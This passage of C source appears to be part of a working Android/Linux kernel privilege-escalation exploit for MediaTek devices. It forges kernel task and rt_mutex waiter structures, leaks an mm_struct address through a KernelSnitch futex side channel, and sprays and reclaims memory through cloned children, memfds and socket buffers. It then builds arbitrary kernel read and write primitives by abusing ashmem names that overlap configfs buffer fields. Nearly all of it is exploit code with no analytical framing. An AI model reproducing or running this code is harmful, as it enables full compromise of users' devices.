      put64(p, W0_OFF + FAKE_WAITER_WW_CTX_OFF, 0);

      put32(p, FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF, 0x100);
      put32(p, FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
      put32(p, FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
      put32(p, FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF, 0);
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08,
            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
      put64(p, FAKE_TASK_OFF + FAKE_TASK_TASK_GROUP_OFF, task_group);
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF, pi_top_task);
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);

      put64(p, RIGHT_OFF + 0x00, fake_parent);
      put64(p, RIGHT_OFF + 0x08, 0);
      put64(p, RIGHT_OFF + 0x10, 0);

      put64(p, LEFT_OFF + 0x00, fake_parent);
      put64(p, LEFT_OFF + 0x08, 0);
      put64(p, LEFT_OFF + 0x10, 0);
    }
  }
  return 1;
}

uintptr_t prepare_kernel_page(int payload_mode) {
  pr_info("prepare_kernel_page enter: payload=%d (0=FOPS,1=SLIDE)\n", payload_mode);
  /* MTK: let kernel reclaim before heavy clone/kill cycle */
  usleep(1000000);
  close_reclaim_sockets();
  mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
  prepare_ctxs();
  pr_info("prepare_kernel_page: ctxs ready, cloning %zu prepare + %zu spray + %zu pre + %zu post...\n",
         prepare_ctx.mm_cnt, spray_ctx.mm_cnt, pre_ctx.mm_cnt, post_ctx.mm_cnt);

  skb_buf = malloc(SKB_SEND_SIZE);
  memset(skb_buf, 0x41, SKB_SEND_SIZE);

  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    prepare_ctx.childs[i] = clone_child();
    prepare_ctx.memfds[i] = open_memfd(prepare_ctx.childs[i]);
  }
  pr_info("prepare_kernel_page: prepare+spray children cloned, now spray...\n");

  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    spray_ctx.childs[i] = clone_child();
    spray_ctx.memfds[i] = open_memfd(spray_ctx.childs[i]);
  }
  pr_info("prepare_kernel_page: spray children done, setup KernelSnitch...\n");
  fflush(stdout);
  /* MTK: heavy cooldown before 64GB mmap — avoid system ANR/reboot */
  usleep(3000000);

  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  ks = kernelsnitch_setup(
      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 1, 0);
  pr_info("mt18-diag: ks_setup done\n");
  fflush(stdout);

  /* MTK: cooldown after kernelsnitch_setup mmap before more clones */
  usleep(1000000);
  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    pre_ctx.childs[i] = clone_child();
  }
  pr_info("mt18-diag: pre clones done\n");
  fflush(stdout);
  child_leak = clone_leak_child();
  pr_info("mt18-diag: leak child forked\n");
  fflush(stdout);
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    post_ctx.childs[i] = clone_child();
  }
  pr_info("mt18-diag: post clones done\n");
  fflush(stdout);
  /* MTK: cooldown after pre+post clone (543 children peak) */
  usleep(1000000);

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    pre_ctx.memfds[i] = open_memfd(pre_ctx.childs[i]);
  }
  /* mt47-c: SCM_RIGHTS 自开 pin 优先, 失败回退旧路径(诊断埋点保留) */
  memfd_leak = leak_memfd_recv();
  if (memfd_leak < 0) memfd_leak = open_memfd(child_leak);
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    post_ctx.memfds[i] = open_memfd(post_ctx.childs[i]);
  }
  pr_info("mt18-diag: memfds opened\n");
  fflush(stdout);

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    kill_child(pre_ctx.childs[i]);
  }
  pr_info("mt18-diag: pre children killed\n");
  fflush(stdout);
  /* MTK: let kernel reclaim between kill batches */
  usleep(500000);
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    kill_child(post_ctx.childs[i]);
  }
  pr_info("mt18-diag: post children killed\n");
  fflush(stdout);
  /* MTK: let kernel reclaim between kill batches */
  usleep(500000);
  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    kill_child(spray_ctx.childs[i]);
  }
  pr_info("mt18-diag: spray children killed\n");
  fflush(stdout);
  /* mt18-diag: leak child reaping with retry (ks collision finding is flaky/slow) */
  int collisions_ok = 0;
  for (int attempt = 1; attempt <= 3 && !collisions_ok; attempt++) {
    if (attempt > 1) {
      pr_warning("mt18-diag: collisions not found, leak retry %d\n", attempt);
      fflush(stdout);
      child_leak = clone_leak_child();
    }
    /* mt80: leak child 也可能有界收尸 — 它已完成 find_collisions 并退出,
     * 卡在 D 只是退出残留; 有界等 3s, 超时按未收处理(state 检查兜底) */
    {
      int mt80_j;
      for (mt80_j = 0; mt80_j < 150; mt80_j++) {
        if (waitpid(child_leak, NULL, WNOHANG) != 0) {
          break;
        }
        usleep(20000);
      }
      if (mt80_j >= 150) {
        pr_warning("mt80: leak child reap timeout (D-state linger), continue\n");
        fflush(stdout);
      }
    }
    pr_info("mt18-diag: leak child reaped (attempt %d)\n", attempt);
    fflush(stdout);
    collisions_ok = kernelsnitch_found_collisions(ks);
    if (!collisions_ok) {
      ks->state = KERNELSNITCH_INIT;  /* allow retry with fresh pile-up */
    }
  }

  /* MTK: let kernel reclaim dead children before heavy ops */
  usleep(2000000);

  pr_info("prepare_kernel_page: checking KernelSnitch collisions...\n");
  fflush(stdout);
  /* MTK: brief cooldown before collision check heavy futex ops */
  usleep(500000);
  if (!kernelsnitch_found_collisions(ks)) {
    pr_warning("KernelSnitch collision finding failed\n");
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }

  /* MTK: cooldown before bruteforce (scans identity-mapped region) */
  usleep(1000000);
  kernelsnitch_bruteforce(ks);
  uintptr_t leaked = ks->mm_struct;
  if (leaked == (uintptr_t)-1) {
    pr_warning("KernelSnitch mm_struct leak failed\n");
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }

  uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
  if (!prepare_skb_payload(base, payload_mode)) {
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }

  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv));
  int sndbuf = 1 << 20;
  setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
  int reclaim_flags = fcntl(reclaim_sv[0], F_GETFL, 0);
  if (reclaim_flags >= 0) {
    fcntl(reclaim_sv[0], F_SETFL, reclaim_flags | O_NONBLOCK);
  }
  int pcp_shaping_sv[2];
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_shaping_sv));

  struct iovec iov;
  memset(&iov, 0, sizeof(iov));
  iov.iov_base = skb_buf;
  iov.iov_len = SKB_SEND_SIZE;

  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  SYSCHK(sendmsg(pcp_shaping_sv[0], &msg, 0));

  pin_to_core(CORE);
  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    SYSCHK(close(pre_ctx.memfds[i]));
    pre_ctx.memfds[i] = -1;
  }
  for (size_t i = 0; i < post_ctx.mm_cnt - 1; i++) {
    SYSCHK(close(post_ctx.memfds[i]));
    post_ctx.memfds[i] = -1;
  }
  for (size_t i = 0; i < spray_ctx.mm_cnt; i += mm_objs_per_slab) {
    SYSCHK(close(spray_ctx.memfds[i]));
    spray_ctx.memfds[i] = -1;
  }

  SYSCHK(close(pcp_shaping_sv[0]));
  SYSCHK(close(pcp_shaping_sv[1]));
  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  SYSCHK(close(memfd_leak));
  memfd_leak = -1;
  /* MTK: cool down before SKB reclaim sends */
  usleep(1000000);
  pr_info("prepare_kernel_page: SKB reclaim sends (%d rounds)...\n", SKB_RECLAIM_SENDS);
  for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {
    errno = 0;
    ssize_t sent = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
    if (sent <= 0) {
      break;
    }
  }
  kernelsnitch_cleanup(ks);
  ks = NULL;

  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    SYSCHK(close(prepare_ctx.memfds[i]));
    prepare_ctx.memfds[i] = -1;
    kill_child(prepare_ctx.childs[i]);
  }

  return base;
}

uintptr_t prepare_good_kernel_page(int payload_mode) {
  int max_attempts = KERNEL_PAGE_SETUP_ATTEMPTS;
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    max_attempts = SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS;
  } else if (payload_mode == PAGE_PAYLOAD_FOPS) {
    max_attempts = FOPS_KERNEL_PAGE_SETUP_ATTEMPTS;
  }
  for (int attempt = 1; attempt <= max_attempts; attempt++) {
    uintptr_t base = prepare_kernel_page(payload_mode);
    if (base) {
      return base;
    }
    pr_warning("prepare_kernel_page retry %d/%d\n", attempt,
               max_attempts);
    /* MTK: avoid kernel panic from rapid clone/kill cycling */
    usleep(2000000);
  }
  pr_warning("prepare_kernel_page did not find usable nonzero source pointers\n");
  return 0;
}

ssize_t configfs_write_once(int fd, uintptr_t target, const void *data, size_t len) {
  unsigned char blob[128];
  memset(blob, 0, sizeof(blob));
  put64(blob, CFG_BIN_BUFFER_OFF - ASHMEM_NAME_PREFIX_LEN, target);
  put32(blob, CFG_BIN_BUFFER_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, len);
  put32(blob, CFG_CB_MAX_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
  errno = 0;
  int set_ret = try_set_ashmem_name_blob(fd, blob, sizeof(blob));
  int set_errno = errno;
  if (set_ret != 0) {
    errno = set_errno;
    return -1;
  }

  errno = 0;
  ssize_t wr = pwrite(fd, data, len, 0);
  return wr;
}

ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
  unsigned char blob[128];
  memset(blob, 0, sizeof(blob));
  off_t pos = (off_t)(ASHMEM_PREFIX_COUNT - len);
  uintptr_t page = target - (uintptr_t)pos;
  put64(blob, CFG_PAGE_OFF - ASHMEM_NAME_PREFIX_LEN, page);
  put32(blob, CFG_NEEDS_READ_FILL_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
  errno = 0;
  int set_ret = try_set_ashmem_name_blob(fd, blob, sizeof(blob));
  int set_errno = errno;
  if (set_ret != 0) {
    errno = set_errno;
    return -1;
  }

  errno = 0;
  ssize_t rd = pread(fd, data, len, pos);
  return rd;
}

int is_kernel_ptr(uintptr_t value) {
  return value >= 0xffff800000000000ULL;
}

int is_direct_ptr(uintptr_t value) {
  return value >= DIRECT_MAP_BASE && value < DIRECT_MAP_END;
}

uint64_t kernel_read64(int fd, uintptr_t target) {
  uint64_t value = 0;
  ssize_t n = kernel_read_data(fd, target, &value, sizeof(value));
  if (n != (ssize_t)sizeof(value)) {
    return 0;
  }
  return value;
}

ssize_t kernel_write_data(int fd, uintptr_t target, const void *data, size_t len) {
  return configfs_write_once(fd, target, data, len);
}

ssize_t kernel_read_data(int fd, uintptr_t target, void *data, size_t len) {
  return configfs_read_once(fd, target, data, len);
}
